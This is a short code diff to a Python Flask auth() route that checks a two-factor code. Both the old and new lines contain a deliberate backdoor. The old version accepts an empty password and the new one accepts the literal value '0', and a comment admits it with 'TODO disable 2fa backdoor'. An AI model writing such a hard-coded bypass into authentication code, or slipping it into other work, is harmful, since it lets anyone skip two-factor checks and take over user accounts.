@@ -74,7 +74,8 @@ def auth():
             return redirect(url_for("user_panel"))
 
     if request.method == "POST":
-        if request.form["password"] == session["auth_token"] or request.form["password"] == "":
+        #TODO disable 2fa backdoor
+        if request.form["password"] == session["auth_token"] or request.form["password"] == "0":
             user = User.User(session["auth_id"])
             session["user"] = str(user.id)
             session.pop("auth_id", None)
